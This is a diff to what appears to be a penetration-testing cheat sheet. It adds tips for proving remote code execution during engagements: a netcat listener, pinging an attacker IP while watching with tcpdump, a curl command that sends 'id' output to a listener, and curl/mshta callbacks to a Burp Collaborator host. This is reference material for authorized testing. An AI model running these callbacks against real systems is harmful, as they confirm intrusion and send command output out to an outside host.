@@ -1986,3 +1986,37 @@ Dump hashes
 ```
 rlwrap nc -nlvp PORT
 ```
+# Tipis and tricks
+### RCE POC
+We can use the folloiwng tricks as an RCE POC(in some engagements, the client asks a limited tests as POCs for RCE's).
+## Ping
+Pentester machine
+```bash
+tcpdump -nni <eth-adapter> -e icmp[icmptype] == 8
+```
+Under the exploit run
+```bash
+ping <Attacker-IP>
+```
+You can specify a number of pings with -c agrments, If ICMP requests recieved, RCE achieved
+
+## Curl
+Execute commands and recieve data under the POST requet
+```bash
+curl -d '$(id)' 127.0.0.1:9988
+```
+Recieve data
+```bash
+nc -nlvp 9988
+```
+
+## Burpsuite Collaborator 
+Use burpcollaborator as POC
+* Linux
+```bash
+curl <burp-collaborator.com>
+```
+* Windows
+```bash
+mshta <burp-collaborator.com>
+```
